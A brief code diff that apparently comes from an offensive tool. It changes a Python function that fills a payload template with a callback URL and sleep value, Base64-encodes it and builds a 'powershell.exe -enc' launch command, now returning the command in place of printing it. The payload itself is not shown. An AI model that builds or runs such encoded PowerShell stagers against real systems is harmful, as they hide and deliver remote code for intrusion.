@@ -31,6 +31,4 @@ def generate(url, sleep):
     payload = payload.replace("%SLEEP%", str(sleep))
     payload = payload.replace("%URL%", url)
     encoded = b64encode(payload.encode('UTF-16LE'))
-    print("")
-    print("powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", ""))
-    print("")
+    return "powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", "")
